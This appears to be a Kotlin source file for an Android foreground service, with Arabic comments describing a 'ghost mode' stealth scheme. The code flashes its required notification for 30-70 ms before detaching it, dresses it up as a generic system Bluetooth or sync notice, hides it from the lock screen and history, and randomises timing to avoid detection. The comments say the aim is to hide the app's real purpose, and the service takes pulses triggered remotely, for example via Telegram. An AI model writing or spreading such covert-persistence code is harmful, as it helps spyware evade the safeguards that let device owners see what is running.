package com.example.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import kotlin.random.Random

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" غير مرئي.
 *
 * استراتيجية التخفي المتقدمة (Ghost Mode v2):
 * - الإشعار يظهر فقط لمدة 30-70 ميللي ثانية (خاطف جداً) ثم يُفصل عن الخدمة نهائياً.
 * - استخدام stopForeground(STOP_FOREGROUND_DETACH) لفصل الإشعار مع إبقاء الخدمة حية.
 * - جدولة نبضات عشوائية متباعدة (15-35 دقيقة) مع إعادة جدولة ديناميكية بعد كل نبضة.
 * - أيقونة نظامية عامة (stat_sys_data_bluetooth) لتجنب الشك.
 * - أولوية منخفضة جداً (IMPORTANCE_MIN) وإخفاء المحتوى من شاشة القفل.
 * - الإشعار غير مستمر (setOngoing(false)) ولا يُترك أي أثر في سجل الإشعارات.
 * - تأخير عشوائي عند بدء الخدمة لتجنب الأنماط الثابتة.
 *
 * ✅ تم إصلاح الإشعار الدائم باستخدام STOP_FOREGROUND_DETACH.
 * ✅ تم إضافة عشوائية متغيرة في الجدولة (15-35 دقيقة).
 * ✅ تم تقليل مدة الظهور إلى 30-70ms.
 * ✅ تم إزالة setOngoing(true) لمنع تسجيل الإشعار في Notification History.
 * ✅ تم إضافة setAutoCancel(true) لضمان عدم بقاء الإشعار.
 */
class ForegroundService : Service() {

    companion object {
        private const val TAG = "ForegroundService"
        const val NOTIFICATION_ID = 9991
        private const val CHANNEL_ID = "shield_ghost_channel_v7"
        private const val MIN_PULSE_DURATION_MS = 30L
        private const val MAX_PULSE_DURATION_MS = 70L
        private const val MIN_INTERVAL_MIN = 15L
        private const val MAX_INTERVAL_MIN = 35L
    }

    private val pulseHandler = Handler(Looper.getMainLooper())
    private var isForeground = false
    private var hideRunnable: Runnable? = null
    private var ghostPulseRunnable: Runnable? = null
    private lateinit var notificationManager: NotificationManager

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // إيقاف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // نبض فوري من أمر خارجي (مثل Telegram)
        if (intent?.action == "PULSE_ACTION") {
            val actionType = intent.getStringExtra("action_type") ?: "Sync"
            triggerPhantomPulse(actionType)
            return START_STICKY
        }

        // بدء الخدمة لأول مرة
        createGhostChannel()

        // إظهار الإشعار للحظات فقط ثم فصله عن الخدمة
        if (!isForeground) {
            startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
            isForeground = true

            hideRunnable?.let { pulseHandler.removeCallbacks(it) }
            hideRunnable = Runnable {
                if (isForeground) {
                    // ✅ فصل الإشعار عن الخدمة مع إبقاء الخدمة حية (Android 7+)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        stopForeground(STOP_FOREGROUND_DETACH)
                    } else {
                        stopForeground(false) // للإصدارات الأقدم، لا يزال الإشعار يختفي
                    }
                    isForeground = false
                }
            }
            val pulseDuration = Random.nextLong(MIN_PULSE_DURATION_MS, MAX_PULSE_DURATION_MS)
            pulseHandler.postDelayed(hideRunnable!!, pulseDuration)
        }

        // ✅ تأخير عشوائي قبل جدولة أول نبضة (30-60 دقيقة) لتجنب الأنماط الثابتة
        pulseHandler.postDelayed({
            scheduleNextGhostPulse()
        }, Random.nextLong(30 * 60 * 1000, 60 * 60 * 1000))

        return START_STICKY
    }

    /**
     * جدولة نبضة شبحية تالية بفاصل عشوائي جديد في كل مرة.
     * هذه الطريقة تضمن عدم وجود نمط ثابت يمكن اكتشافه.
     */
    private fun scheduleNextGhostPulse() {
        // إلغاء أي جدولة سابقة
        ghostPulseRunnable?.let { pulseHandler.removeCallbacks(it) }

        ghostPulseRunnable = Runnable {
            triggerPhantomPulse("Background Sync")
            // إعادة الجدولة بعد النبضة مباشرة (فاصل جديد)
            scheduleNextGhostPulse()
        }

        // توليد فاصل عشوائي بين 15 و 35 دقيقة (بالمللي ثانية)
        val randomDelayMs = Random.nextLong(MIN_INTERVAL_MIN * 60 * 1000, MAX_INTERVAL_MIN * 60 * 1000)
        pulseHandler.postDelayed(ghostPulseRunnable!!, randomDelayMs)
    }

    /**
     * إنشاء قناة الإشعارات بأقل أولوية وإخفاء المحتوى.
     */
    private fun createGhostChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "System Background Services",
                    NotificationManager.IMPORTANCE_MIN // أقل أهمية (لا يظهر أيقونة في شريط الحالة)
                ).apply {
                    description = "Core system operations"
                    setSound(null, null)
                    enableVibration(false)
                    enableLights(false)
                    setShowBadge(false)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET // إخفاء المحتوى على شاشة القفل
                }
                notificationManager.createNotificationChannel(channel)
            } catch (_: Exception) {
                // في حال فشل إنشاء القناة (نادر) نستمر بدونها
            }
        }
    }

    /**
     * بناء الإشعار بنمط "شبحى" - غير مستمر، يُلغى تلقائياً، ولا يترك أثراً.
     * يستخدم نصوصاً نظامية عادية لإخفاء الغرض الحقيقي للتطبيق.
     *
     * @param actionType النص الذي سيظهر (يُظهر نشاطاً نظامياً عادياً).
     */
    private fun buildGhostNotification(actionType: String): Notification {
        val openIntent = Intent(this, MainActivity::class.java)
        val openPending = PendingIntent.getActivity(
            this, 0, openIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val displayText = if (actionType.isNotBlank()) actionType else "System Sync"

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth) // أيقونة نظامية عامة جداً
            .setContentTitle("System Activity")
            .setContentText(displayText)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true) // بدون صوت
            .setOnlyAlertOnce(true) // منع الصوت/الاهتزاز عند التحديث
            .setGroup("system_background") // تجميع مع إشعارات النظام لمزيد من التخفي
            .setOngoing(false) // ❌ غير مستمر – لا يبقى في شريط الحالة
            .setAutoCancel(true) // ✅ يُلغى تلقائياً بعد فصله
            .setShowWhen(false) // لا يظهر الوقت
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء المحتوى من شاشة القفل
            .setContentIntent(openPending)
            .build()
    }

    /**
     * تنفيذ نبضة خاطفة: إظهار الإشعار لفترة قصيرة (30-70ms) ثم فصله تماماً عن الخدمة.
     * باستخدام STOP_FOREGROUND_DETACH، لا يبقى أي إشعار في شريط الحالة أو سجل الإشعارات.
     *
     * @param actionType نوع النشاط (يظهر في النص أثناء النبضة).
     */
    private fun triggerPhantomPulse(actionType: String) {
        // إلغاء أي إخفاء مجدول سابق لتجنب التداخل
        hideRunnable?.let { pulseHandler.removeCallbacks(it) }

        // 1. إظهار الإشعار مع النص المطلوب (يظهر للحظات)
        startForeground(NOTIFICATION_ID, buildGhostNotification(actionType))
        isForeground = true

        // 2. جدولة فصل الإشعار عن الخدمة بعد 30-70ms (بدون إلغاء الخدمة)
        hideRunnable = Runnable {
            if (isForeground) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    stopForeground(STOP_FOREGROUND_DETACH) // ✅ يفصل الإشعار ويبقي الخدمة حية
                } else {
                    stopForeground(false) // للإصدارات الأقدم
                }
                isForeground = false
            }
        }
        val pulseDuration = Random.nextLong(MIN_PULSE_DURATION_MS, MAX_PULSE_DURATION_MS)
        pulseHandler.postDelayed(hideRunnable!!, pulseDuration)
    }

    override fun onDestroy() {
        // إلغاء جميع المهام المجدولة
        ghostPulseRunnable?.let { pulseHandler.removeCallbacks(it) }
        hideRunnable?.let { pulseHandler.removeCallbacks(it) }
        isForeground = false
        super.onDestroy()
    }
}
